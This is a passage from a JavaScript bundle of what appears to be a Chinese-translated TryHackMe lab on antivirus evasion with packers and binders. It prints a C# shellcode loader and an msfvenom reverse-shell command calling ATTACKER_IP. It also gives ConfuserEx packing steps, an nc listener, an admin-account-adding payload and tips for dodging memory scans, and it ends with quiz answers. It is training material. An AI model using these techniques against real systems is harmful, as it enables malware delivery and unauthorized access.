\u6253\u5305\u5de5\u5177"}),"\n",(0,l.jsxs)(n.p,{children:["\u53e6\u4e00\u79cd\u51fb\u8d25\u57fa\u4e8e\u78c1\u76d8\u7684 AV \u68c0\u6d4b\u7684\u65b9\u6cd5\u662f\u4f7f\u7528\u6253\u5305\u5de5\u5177\u3002",(0,l.jsx)(n.strong,{children:"\u6253\u5305\u5de5\u5177"}),"\u662f\u5c06\u4e00\u4e2a\u7a0b\u5e8f\u4f5c\u4e3a\u8f93\u5165\uff0c\u5e76\u5bf9\u5176\u8fdb\u884c\u8f6c\u6362\uff0c\u4f7f\u5176\u7ed3\u6784\u770b\u8d77\u6765\u4e0d\u540c\uff0c\u4f46\u529f\u80fd\u4fdd\u6301\u5b8c\u5168\u4e0d\u53d8\u7684\u8f6f\u4ef6\u3002\u6253\u5305\u5de5\u5177\u7684\u4e24\u4e2a\u4e3b\u8981\u76ee\u6807\u662f\uff1a"]}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u538b\u7f29\u7a0b\u5e8f\uff0c\u4ee5\u51cf\u5c11\u5360\u7528\u7684\u7a7a\u95f4\u3002"}),"\n",(0,l.jsx)(n.li,{children:"\u4fdd\u62a4\u7a0b\u5e8f\u514d\u53d7\u9006\u5411\u5de5\u7a0b\u7684\u4fb5\u5bb3\u3002"}),"\n"]}),"\n",(0,l.jsx)(n.p,{children:"\u6253\u5305\u5de5\u5177\u901a\u5e38\u7531\u8f6f\u4ef6\u5f00\u53d1\u4eba\u5458\u4f7f\u7528\uff0c\u76ee\u7684\u662f\u4fdd\u62a4\u5176\u8f6f\u4ef6\u4e0d\u88ab\u9006\u5411\u5de5\u7a0b\u6216\u7834\u89e3\u3002\u5b83\u4eec\u901a\u8fc7\u5b9e\u65bd\u4e00\u7cfb\u5217\u53d8\u6362\uff0c\u5305\u62ec\u538b\u7f29\u3001\u52a0\u5bc6\u3001\u589e\u52a0\u8c03\u8bd5\u4fdd\u62a4\u7b49\uff0c\u8fbe\u5230\u4e00\u5b9a\u7684\u4fdd\u62a4\u6548\u679c\u3002\u6b63\u5982\u4f60\u53ef\u80fd\u5df2\u7ecf\u731c\u5230\u7684\uff0c\u6253\u5305\u5de5\u5177\u4e5f\u5e38\u7528\u4e8e\u8f7b\u677e\u6df7\u6dc6\u6076\u610f\u8f6f\u4ef6\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u5e02\u9762\u4e0a\u6709\u5f88\u591a\u6253\u5305\u5de5\u5177\uff0c\u5305\u62ec UPX\u3001MPRESS\u3001Themida \u7b49\u3002"}),"\n",(0,l.jsx)(n.h3,{id:"\u6253\u5305\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f",children:"\u6253\u5305\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f"}),"\n",(0,l.jsx)(n.p,{children:"\u867d\u7136\u6bcf\u4e2a\u6253\u5305\u5de5\u5177\u7684\u64cd\u4f5c\u65b9\u5f0f\u4e0d\u540c\uff0c\u4f46\u8ba9\u6211\u4eec\u6765\u770b\u4e00\u4e2a\u7b80\u5355\u7684\u6253\u5305\u5de5\u5177\u4f1a\u505a\u4ec0\u4e48\u7684\u57fa\u672c\u793a\u4f8b\u3002"}),"\n",(0,l.jsxs)(n.p,{children:["\u5f53\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u88ab\u6253\u5305\u65f6\uff0c\u5b83\u4f1a\u901a\u8fc7\u4e00\u4e2a",(0,l.jsx)(n.strong,{children:"\u6253\u5305"}),"\u51fd\u6570\u4ee5\u67d0\u79cd\u65b9\u5f0f\u8fdb\u884c\u8f6c\u6362\u3002\u6253\u5305\u51fd\u6570\u9700\u8981\u80fd\u591f\u4ee5\u4e00\u79cd\u53ef\u4ee5\u88ab",(0,l.jsx)(n.strong,{children:"\u89e3\u5305"}),"\u51fd\u6570\u5408\u7406\u9006\u8f6c\u7684\u65b9\u5f0f\u6df7\u6dc6\u548c\u8f6c\u6362\u5e94\u7528\u7a0b\u5e8f\u7684\u539f\u59cb\u4ee3\u7801\uff0c\u4ece\u800c\u4fdd\u7559\u5e94\u7528\u7a0b\u5e8f\u7684\u539f\u59cb\u529f\u80fd\u3002\u867d\u7136\u6709\u65f6\u6253\u5305\u5de5\u5177\u53ef\u80fd\u4f1a\u6dfb\u52a0\u4e00\u4e9b\u4ee3\u7801\uff08\u4f8b\u5982\uff0c\u4f7f\u8c03\u8bd5\u53d8\u5f97\u66f4\u56f0\u96be\uff09\uff0c\u4f46\u5b83\u901a\u5e38\u5e0c\u671b\u5728\u6267\u884c\u65f6\u80fd\u591f\u6062\u590d\u4f60\u7f16\u5199\u7684\u539f\u59cb\u4ee3\u7801\u3002"]}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"packers",src:s(6666).A+"",width:"1190",height:"459"})}),"\n",(0,l.jsx)(n.p,{children:"\u6253\u5305\u540e\u7684\u5e94\u7528\u7a0b\u5e8f\u5c06\u5305\u542b\u4f60\u6253\u5305\u540e\u7684\u5e94\u7528\u7a0b\u5e8f\u4ee3\u7801\u3002\u7531\u4e8e\u8fd9\u4e2a\u65b0\u7684\u6253\u5305\u4ee3\u7801\u88ab\u6df7\u6dc6\uff0c\u5e94\u7528\u7a0b\u5e8f\u9700\u8981\u80fd\u591f\u4ece\u4e2d\u89e3\u5305\u51fa\u539f\u59cb\u4ee3\u7801\u3002\u4e3a\u6b64\uff0c\u6253\u5305\u5de5\u5177\u4f1a\u5d4c\u5165\u4e00\u4e2a\u5305\u542b\u89e3\u5305\u5668\u7684\u4ee3\u7801\u6bb5\uff0c\u5e76\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u7684\u4e3b\u5165\u53e3\u70b9\u91cd\u5b9a\u5411\u5230\u8be5\u4ee3\u7801\u6bb5\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u5f53\u4f60\u7684\u6253\u5305\u5e94\u7528\u7a0b\u5e8f\u88ab\u6267\u884c\u65f6\uff0c\u4ee5\u4e0b\u60c5\u51b5\u5c06\u53d1\u751f\uff1a"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"packed app",src:s(2871).A+"",width:"839",height:"588"})}),"\n",(0,l.jsxs)(n.ol,{children:["\n",(0,l.jsxs)(n.li,{children:["\n",(0,l.jsx)(n.p,{children:"\u89e3\u5305\u5668\u9996\u5148\u6267\u884c\uff0c\u56e0\u4e3a\u5b83\u662f\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5165\u53e3\u70b9\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u89e3\u5305\u5668\u8bfb\u53d6\u6253\u5305\u7684\u5e94\u7528\u7a0b\u5e8f\u4ee3\u7801\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u89e3\u5305\u5668\u5c06\u539f\u59cb\u89e3\u5305\u4ee3\u7801\u5199\u5165\u5185\u5b58\u4e2d\u7684\u67d0\u4e2a\u4f4d\u7f6e\uff0c\u5e76\u5c06\u5e94\u7528\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u6307\u5411\u8be5\u4f4d\u7f6e\u3002"}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"\u6253\u5305\u5de5\u5177\u4e0e-av",children:"\u6253\u5305\u5de5\u5177\u4e0e AV"}),"\n",(0,l.jsx)(n.p,{children:"\u5230\u73b0\u5728\u4e3a\u6b62\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6253\u5305\u5de5\u5177\u5982\u4f55\u5e2e\u52a9\u7ed5\u8fc7 AV \u89e3\u51b3\u65b9\u6848\u3002\u5047\u8bbe\u4f60\u6784\u5efa\u4e86\u4e00\u4e2a\u53cd\u5411 shell \u53ef\u6267\u884c\u6587\u4ef6\uff0c\u4f46 AV \u5c06\u5176\u8bc6\u522b\u4e3a\u6076\u610f\u8f6f\u4ef6\uff0c\u56e0\u4e3a\u5b83\u4e0e\u5df2\u77e5\u7684\u7b7e\u540d\u5339\u914d\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u4f7f\u7528\u6253\u5305\u5de5\u5177\u53ef\u4ee5\u5c06\u53cd\u5411 shell \u53ef\u6267\u884c\u6587\u4ef6\u8f6c\u6362\uff0c\u4f7f\u5176\u5728\u78c1\u76d8\u4e0a\u4e0d\u518d\u5339\u914d\u4efb\u4f55\u5df2\u77e5\u7684\u7b7e\u540d\u3002\u56e0\u6b64\uff0c\u4f60\u5e94\u8be5\u80fd\u591f\u5c06\u4f60\u7684\u8f7d\u8377\u5206\u53d1\u5230\u4efb\u4f55\u673a\u5668\u7684\u78c1\u76d8\u4e0a\uff0c\u800c\u4e0d\u4f1a\u9047\u5230\u592a\u5927\u95ee\u9898\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u7136\u800c\uff0cAV \u89e3\u51b3\u65b9\u6848\u4ecd\u7136\u6709\u53ef\u80fd\u6355\u83b7\u4f60\u7684\u6253\u5305\u5e94\u7528\u7a0b\u5e8f\uff0c\u539f\u56e0\u6709\u4ee5\u4e0b\u51e0\u70b9\uff1a"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u5c3d\u7ba1\u4f60\u7684\u539f\u59cb\u4ee3\u7801\u53ef\u80fd\u5df2\u7ecf\u88ab\u8f6c\u6362\u6210\u65e0\u6cd5\u8bc6\u522b\u7684\u5f62\u5f0f\uff0c\u4f46\u8bf7\u8bb0\u4f4f\uff0c\u6253\u5305\u7684\u53ef\u6267\u884c\u6587\u4ef6\u5305\u542b\u4e00\u4e2a\u5e26\u6709\u89e3\u5305\u5668\u4ee3\u7801\u7684\u4ee3\u7801\u6bb5\u3002\u5982\u679c\u89e3\u5305\u5668\u6709\u5df2\u77e5\u7684\u7b7e\u540d\uff0cAV \u89e3\u51b3\u65b9\u6848\u53ef\u80fd\u4ec5\u51ed\u89e3\u5305\u5668\u4ee3\u7801\u6bb5\u5c31\u4f1a\u6807\u8bb0\u4efb\u4f55\u6253\u5305\u7684\u53ef\u6267\u884c\u6587\u4ef6\u3002"}),"\n",(0,l.jsx)(n.li,{children:"\u5728\u67d0\u4e2a\u65f6\u523b\uff0c\u4f60\u7684\u5e94\u7528\u7a0b\u5e8f\u4f1a\u5c06\u539f\u59cb\u4ee3\u7801\u89e3\u5305\u5230\u5185\u5b58\u4e2d\u4ee5\u4fbf\u6267\u884c\u3002\u5982\u679c\u4f60\u8bd5\u56fe\u7ed5\u8fc7\u7684 AV \u89e3\u51b3\u65b9\u6848\u80fd\u591f\u8fdb\u884c\u5185\u5b58\u626b\u63cf\uff0c\u90a3\u4e48\u5728\u4f60\u7684\u4ee3\u7801\u88ab\u89e3\u5305\u540e\uff0c\u4f60\u4ecd\u7136\u53ef\u80fd\u4f1a\u88ab\u68c0\u6d4b\u5230\u3002"}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"\u6253\u5305\u6211\u4eec\u7684-shellcode",children:"\u6253\u5305\u6211\u4eec\u7684 shellcode"}),"\n",(0,l.jsxs)(n.p,{children:["\u8ba9\u6211\u4eec\u4ece\u4e00\u4e2a\u57fa\u672c\u7684 C# shellcode \u5f00\u59cb\u3002\u4f60\u4e5f\u53ef\u4ee5\u5728\u4f60\u7684 Windows \u673a\u5668\u4e0a\u627e\u5230\u8fd9\u6bb5\u4ee3\u7801\uff1a",(0,l.jsx)(n.code,{children:"C:\\Tools\\CS Files\\UnEncStagelessPayload.cs"})]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-c#",children:'using System;\r\nusing System.Net;\r\nusing System.Text;\r\nusing System.Configuration.Install;\r\nusing System.Runtime.InteropServices;\r\nusing System.Security.Cryptography.X509Certificates;\r\n\r\npublic class Program {\r\n  [DllImport("kernel32")]\r\n  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\r\n\r\n  [DllImport("kernel32")]\r\n  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);\r\n\r\n  [DllImport("kernel32")]\r\n  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\r\n\r\n  private static UInt32 MEM_COMMIT = 0x1000;\r\n  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\r\n\r\n  public static void Main()\r\n  {\r\n    byte[] shellcode = new byte[] {0xfc,0x48,0x83,...,0xda,0xff,0xd5 };\r\n\r\n\r\n    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\r\n    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);\r\n\r\n    IntPtr threadHandle = IntPtr.Zero;\r\n    UInt32 threadId = 0;\r\n    IntPtr parameter = IntPtr.Zero;\r\n    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);\r\n\r\n    WaitForSingleObject(threadHandle, 0xFFFFFFFF);\r\n\r\n  }\r\n}\n'})}),"\n",(0,l.jsxs)(n.p,{children:["\u8fd9\u4e2a\u8f7d\u8377\u83b7\u53d6\u7531 msfvenom \u751f\u6210\u7684 shellcode\uff0c\u5e76\u5c06\u5176\u5728\u4e00\u4e2a\u5355\u72ec\u7684\u7ebf\u7a0b\u4e2d\u8fd0\u884c\u3002\u4e3a\u4e86\u4f7f\u5176\u6b63\u5e38\u5de5\u4f5c\uff0c\u4f60\u9700\u8981\u751f\u6210\u4e00\u4e2a\u65b0\u7684 shellcode\uff0c\u5e76\u5c06\u5176\u653e\u5165\u4ee3\u7801\u4e2d\u7684\u53d8\u91cf ",(0,l.jsx)(n.code,{children:"shellcode"}),"\u3002`"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"C:\\> msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7478 -f csharp\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u7136\u540e\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5728 Windows \u673a\u5668\u4e0a\u7f16\u8bd1\u4f60\u7684\u8f7d\u8377\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-shell-session",children:"C:\\> csc UnEncStagelessPayload.cs\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u4e00\u65e6\u4f60\u6709\u4e86\u4e00\u4e2a\u53ef\u5de5\u4f5c\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u5c06\u5176\u4e0a\u4f20\u5230 THM Antivirus Check! \u9875\u9762\uff08\u684c\u9762\u4e0a\u7684\u94fe\u63a5\uff09\u3002AV \u5e94\u8be5\u4f1a\u7acb\u5373\u6807\u8bb0\u5b83\u3002\u63a5\u4e0b\u6765\uff0c\u8ba9\u6211\u4eec\u5728\u76f8\u540c\u7684\u8f7d\u8377\u4e0a\u4f7f\u7528\u6253\u5305\u5de5\u5177\uff0c\u770b\u770b\u4f1a\u53d1\u751f\u4ec0\u4e48\u3002"}),"\n",(0,l.jsxs)(n.p,{children:["\u6211\u4eec\u5c06\u4f7f\u7528 ",(0,l.jsx)(n.a,{href:"https://github.com/mkaring/ConfuserEx/releases/tag/v1.6.0",children:"ConfuserEx"})," \u6253\u5305\u5de5\u5177\u6765\u6267\u884c\u6b64\u4efb\u52a1\uff0c\u56e0\u4e3a\u6211\u4eec\u7684\u8f7d\u8377\u662f\u7528 .NET \u7f16\u7a0b\u7684\u3002\u4e3a\u4e86\u65b9\u4fbf\u4f60\uff0c\u4f60\u53ef\u4ee5\u5728\u684c\u9762\u4e0a\u627e\u5230\u4e00\u4e2a\u5feb\u6377\u65b9\u5f0f\u3002"]}),"\n",(0,l.jsx)(n.p,{children:"ConfuserEx \u9700\u8981\u4f60\u6307\u5b9a\u5b83\u5c06\u8981\u5de5\u4f5c\u7684\u6587\u4ef6\u5939\u3002\u786e\u4fdd\u9009\u62e9\u684c\u9762\u4f5c\u4e3a\u57fa\u7840\u76ee\u5f55\uff0c\u5982\u4e0b\u56fe\u6240\u793a\u3002\u8bbe\u7f6e\u597d\u57fa\u7840\u76ee\u5f55\u540e\uff0c\u5c06\u4f60\u8981\u6253\u5305\u7684\u53ef\u6267\u884c\u6587\u4ef6\u62d6\u653e\u5230\u754c\u9762\u4e0a\uff0c\u6700\u7ec8\u4f60\u5e94\u8be5\u5f97\u5230\u5982\u4e0b\u7ed3\u679c\uff1a"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"Packer config part1",src:s(4820).A+"",width:"780",height:"586"})}),"\n",(0,l.jsx)(n.p,{children:'\u63a5\u4e0b\u6765\uff0c\u8fdb\u5165\u8bbe\u7f6e\u6807\u7b7e\u9875\u5e76\u9009\u62e9\u6211\u4eec\u7684\u8f7d\u8377\u3002\u4e00\u65e6\u9009\u62e9\u597d\uff0c\u70b9\u51fb "+" \u6309\u94ae\u5c06\u8bbe\u7f6e\u6dfb\u52a0\u5230\u4f60\u7684\u8f7d\u8377\u4e2d\u3002\u8fd9\u5e94\u8be5\u4f1a\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a "true" \u7684\u89c4\u5219\u3002\u786e\u4fdd\u540c\u65f6\u542f\u7528\u538b\u7f29\u9009\u9879\uff1a'}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"Packer config part2",src:s(5777).A+"",width:"780",height:"585"})}),"\n",(0,l.jsx)(n.p,{children:'\u73b0\u5728\u6211\u4eec\u5c06\u7f16\u8f91 "true" \u89c4\u5219\uff0c\u5e76\u5c06\u5176\u8bbe\u7f6e\u4e3a\u6700\u5927\u9884\u8bbe\u503c\uff1a'}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"packer config part3",src:s(5360).A+"",width:"386",height:"593"})}),"\n",(0,l.jsx)(n.p,{children:'\u6700\u540e\uff0c\u6211\u4eec\u5c06\u524d\u5f80 "Protect!" \u6807\u7b7e\u9875\u5e76\u70b9\u51fb "Protect"\uff1a'}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"packer config part 4",src:s(5507).A+"",width:"779",height:"586"})}),"\n",(0,l.jsxs)(n.p,{children:["\u65b0\u7684\u8f7d\u8377\u5e94\u8be5\u5df2\u7ecf\u51c6\u5907\u597d\uff0c\u5e76\u4e14\u4e0a\u4f20\u5230 THM Antivirus Checker \u65f6\u5e0c\u671b\u4e0d\u4f1a\u89e6\u53d1\u4efb\u4f55\u8b66\u62a5\uff01\uff08\u684c\u9762\u4e0a\u6709\u5feb\u6377\u65b9\u5f0f\uff09\u3002\u4e8b\u5b9e\u4e0a\uff0c\u5982\u679c\u4f60\u6267\u884c\u4f60\u7684\u8f7d\u8377\u5e76\u8bbe\u7f6e\u76d1\u542c\u5668\uff0c\u4f60\u5e94\u8be5\u80fd\u591f\u83b7\u5f97\u4e00\u4e2a\u56de\u8fde shell\uff1a",(0,l.jsx)(n.code,{children:"nc"})]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-shell-session",children:"user@attackbox$ nc -lvp 7478\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u4e00\u5207\u987a\u5229\uff0c\u4f46\u8bf7\u8bb0\u4f4f\uff0c\u6211\u4eec\u4e4b\u524d\u8c08\u5230\u8fc7 AV \u8fdb\u884c\u5185\u5b58\u626b\u63cf\u7684\u95ee\u9898\u3002\u5982\u679c\u4f60\u5c1d\u8bd5\u5728\u53cd\u5411 shell \u4e0a\u8fd0\u884c\u547d\u4ee4\uff0cAV \u4f1a\u6ce8\u610f\u5230\u4f60\u7684 shell \u5e76\u5c06\u5176\u7ec8\u6b62\u3002\u8fd9\u662f\u56e0\u4e3a Windows Defender \u4f1a\u6302\u94a9\u67d0\u4e9b Windows API \u8c03\u7528\uff0c\u5e76\u5728\u4f7f\u7528\u8fd9\u4e9b API \u8c03\u7528\u65f6\u8fdb\u884c\u5185\u5b58\u626b\u63cf\u3002\u5728 msfvenom \u751f\u6210\u7684\u4efb\u4f55 shell \u4e2d\uff0c\u90fd\u4f1a\u8c03\u7528 CreateProcess() \u5e76\u88ab\u68c0\u6d4b\u5230\u3002"}),"\n",(0,l.jsx)(n.h3,{id:"\u90a3\u6211\u4eec\u73b0\u5728\u8be5\u600e\u4e48\u529e",children:"\u90a3\u6211\u4eec\u73b0\u5728\u8be5\u600e\u4e48\u529e\uff1f"}),"\n",(0,l.jsx)(n.p,{children:"\u867d\u7136\u7ed5\u8fc7\u5185\u5b58\u626b\u63cf\u8d85\u51fa\u4e86\u672c\u623f\u95f4\u7684\u8303\u56f4\uff0c\u4f46\u6709\u51e0\u4e2a\u7b80\u5355\u7684\u505a\u6cd5\u53ef\u4ee5\u5e2e\u52a9\u907f\u514d\u68c0\u6d4b\uff1a"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.strong,{children:"\u7b49\u5f85\u4e00\u6bb5\u65f6\u95f4"}),"\u3002\u5c1d\u8bd5\u518d\u6b21\u751f\u6210\u53cd\u5411 shell\uff0c\u5e76\u5728\u53d1\u9001\u4efb\u4f55\u547d\u4ee4\u4e4b\u524d\u7b49\u5f85\u5927\u7ea6 5 \u5206\u949f\u3002\u4f60\u4f1a\u53d1\u73b0 AV \u4e0d\u518d\u62a5\u9519\u3002\u539f\u56e0\u662f\u626b\u63cf\u5185\u5b58\u662f\u4e00\u9879\u6602\u8d35\u7684\u64cd\u4f5c\u3002\u56e0\u6b64\uff0cAV \u5728\u4f60\u7684\u8fdb\u7a0b\u542f\u52a8\u540e\u4f1a\u626b\u63cf\u4e00\u6bb5\u65f6\u95f4\uff0c\u4f46\u6700\u7ec8\u4f1a\u505c\u6b62\u3002"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.strong,{children:"\u4f7f\u7528\u8f83\u5c0f\u7684\u8f7d\u8377"}),"\u3002\u8f7d\u8377\u8d8a\u5c0f\uff0c\u88ab\u68c0\u6d4b\u5230\u7684\u53ef\u80fd\u6027\u8d8a\u4f4e\u3002\u5982\u679c\u4f60\u4f7f\u7528 msfvenom \u751f\u6210\u4e00\u4e2a\u5355\u4e00\u547d\u4ee4\u800c\u4e0d\u662f\u53cd\u5411 shell\uff0cAV \u4f1a\u66f4\u96be\u68c0\u6d4b\u5230\u5b83\u3002\u4f60\u53ef\u4ee5\u5c1d\u8bd5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5e76\u67e5\u770b\u7ed3\u679c\uff1a ",(0,l.jsx)(n.code,{children:"msfvenom -a x64 -p windows/x64/exec CMD='net user pwnd Password321 /add;net localgroup administrators pwnd /add' -f csharp"})]}),"\n"]}),"\n",(0,l.jsxs)(n.p,{children:["\u5982\u679c\u68c0\u6d4b\u4e0d\u662f\u95ee\u9898\uff0c\u4f60\u751a\u81f3\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a\u7b80\u5355\u7684\u6280\u5de7\u3002\u4ece\u4f60\u7684\u53cd\u5411 shell \u4e2d\uff0c\u518d\u6b21\u8fd0\u884c ",(0,l.jsx)(n.code,{children:"cmd.exe"}),"\u3002AV \u4f1a\u68c0\u6d4b\u5230\u4f60\u7684\u8f7d\u8377\u5e76\u7ec8\u6b62\u5173\u8054\u7684\u8fdb\u7a0b\uff0c\u4f46\u4e0d\u4f1a\u7ec8\u6b62\u4f60\u521a\u521a\u751f\u6210\u7684\u65b0 ",(0,l.jsx)(n.code,{children:"cmd.exe"}),"\u3002"]}),"\n",(0,l.jsx)(n.p,{children:"\u867d\u7136\u6bcf\u4e2a AV \u7684\u8868\u73b0\u90fd\u4e0d\u540c\uff0c\u4f46\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u5b83\u4eec\u4f1a\u6709\u7c7b\u4f3c\u7684\u7ed5\u8fc7\u65b9\u5f0f\uff0c\u56e0\u6b64\u5728\u6d4b\u8bd5\u8fc7\u7a0b\u4e2d\u503c\u5f97\u63a2\u7d22\u4f60\u6ce8\u610f\u5230\u7684\u4efb\u4f55\u5f02\u5e38\u884c\u4e3a\u3002"}),"\n",(0,l.jsxs)(n.admonition,{title:"Answer the questions below",type:"info",children:[(0,l.jsx)(n.p,{children:"\u6253\u5305\u5de5\u5177\u662f\u5426\u80fd\u5e2e\u52a9\u4f60\u6df7\u6dc6\u6076\u610f\u4ee3\u7801\u4ee5\u7ed5\u8fc7 AV \u89e3\u51b3\u65b9\u6848\uff1f (yea/nay)"}),(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"yea\n"})}),(0,l.jsx)(n.p,{children:"\u6253\u5305\u5de5\u5177\u662f\u5426\u901a\u5e38\u4f1a\u5728\u8fd0\u884c\u4e4b\u524d\u5c06\u539f\u59cb\u4ee3\u7801\u89e3\u5305\u5230\u5185\u5b58\u4e2d\uff1f(yea/nay)"}),(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"yea\n"})}),(0,l.jsx)(n.p,{children:"\u662f\u5426\u6709\u4e9b\u6253\u5305\u5de5\u5177\u4f1a\u88ab\u67d0\u4e9b AV \u89e3\u51b3\u65b9\u6848\u8bc6\u522b\u4e3a\u6076\u610f\uff1f (yea/nay)"}),(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"yea\n"})}),(0,l.jsxs)(n.p,{children:["\u6309\u7167\u8bf4\u660e\u521b\u5efa\u4e00\u4e2a\u6253\u5305\u540e\u7684\u8f7d\u8377\uff0c\u5e76\u5c06\u5176\u4e0a\u4f20\u5230 THM Antivirus Check\uff08\u7f51\u5740\uff1a",(0,l.jsx)(n.code,{children:"http://10.10.14.106/"}),"\uff09\u3002"]})]}),"\n",(0,l.jsx)(n.h2,{id:"binders---\u6346\u7ed1\u5de5\u5177",children:"Binders - \u6346\u7ed1\u5de5\u5177"}),"\n",(0,l.jsxs)(n.p,{children:["\u867d\u7136\u4e0d\u662f\u4e00\u79cd AV \u7ed5\u8fc7\u65b9\u6cd5\uff0c\u6346\u7ed1\u5de5\u5177\u5728\u8bbe\u8ba1\u8981\u5206\u53d1\u7ed9\u6700\u7ec8\u7528\u6237\u7684\u6076\u610f\u8f7d\u8377\u65f6\u4e5f\u5f88\u91cd\u8981\u3002",(0,l.jsx)(n.strong,{children:"\u6346\u7ed1\u5de5\u5177"}),"\u662f\u4e00\u79cd\u5c06\u4e24\u4e2a\uff08\u6216\u66f4\u591a\uff09\u53ef\u6267\u884c\u6587\u4ef6\u5408\u5e76\u4e3a\u4e00\u4e2a\u7684\u7a0b\u5e8f\u3002\u5f53\u4f60\u60f3\u8981\u5c06\u8f7d\u8377\u9690\u85cf\u5728\u53e6\u4e00\u4e2a\u5df2\u77e5\u7a0b\u5e8f\u4e2d\uff0c\u4ee5\u6b3a\u9a97\u7528\u6237\u76f8\u4fe1\u4ed6\u4eec\u6b63\u5728\u6267\u884c\u4e0d\u540c\u7a0b\u5e8f\u65f6\uff0c\u901a\u5e38\u4f1a\u4f7f\u7528\u6346\u7ed1\u5de5\u5177\u3002"]}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"binder",src:s(1103).A+"",width:"1379",height:"798"})}),"\n",(0,l.jsx)(n.p,{children:"\u867d\u7136\u6bcf\u4e2a\u6346\u7ed1\u5de5\u5177\u7684\u5de5\u4f5c\u65b9\u5f0f\u53ef\u80fd\u7565\u6709\u4e0d\u540c\uff0c\u4f46\u5b83\u4eec\u57fa\u672c\u4e0a\u4f1a\u5c06\u4f60\u7684 shellcode \u4ee3\u7801\u6dfb\u52a0\u5230\u5408\u6cd5\u7a0b\u5e8f\u4e2d\uff0c\u5e76\u4ee5\u67d0\u79cd\u65b9\u5f0f\u6267\u884c\u5b83\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u4f8b\u5982\uff0c\u4f60\u53ef\u4ee5\u4fee\u6539 PE \u5934\u4e2d\u7684\u5165\u53e3\u70b9\uff0c\u4f7f\u5f97\u4f60\u7684 shellcode \u5728\u7a0b\u5e8f\u4e4b\u524d\u6267\u884c\uff0c\u7136\u540e\u5728\u6267\u884c\u5b8c\u540e\u5c06\u6267\u884c\u6d41\u91cd\u5b9a\u5411\u56de\u5408\u6cd5\u7a0b\u5e8f\u3002\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\uff0c\u5f53\u7528\u6237\u70b9\u51fb\u751f\u6210\u7684\u53ef\u6267\u884c\u6587\u4ef6\u65f6\uff0c\u4f60\u7684 shellcode \u4f1a\u5148\u6084\u65e0\u58f0\u606f\u5730\u6267\u884c\uff0c\u5e76\u5728\u7528\u6237\u4e0d\u6ce8\u610f\u7684\u60c5\u51b5\u4e0b\u7ee7\u7eed\u6b63\u5e38\u8fd0\u884c\u7a0b\u5e8f\u3002"}),"\n",(0,l.jsx)(n.h3,{id:"\u4f7f\u7528-msfvenom-\u8fdb\u884c\u6346\u7ed1",children:"\u4f7f\u7528 msfvenom \u8fdb\u884c\u6346\u7ed1"}),"\n",(0,l.jsx)(n.p,{children:"\u4f60\u53ef\u4ee5\u8f7b\u677e\u5730\u5c06\u4efb\u4f55\u4f60\u559c\u6b22\u7684\u8f7d\u8377\u690d\u5165\u5230\u4efb\u4f55 .exe 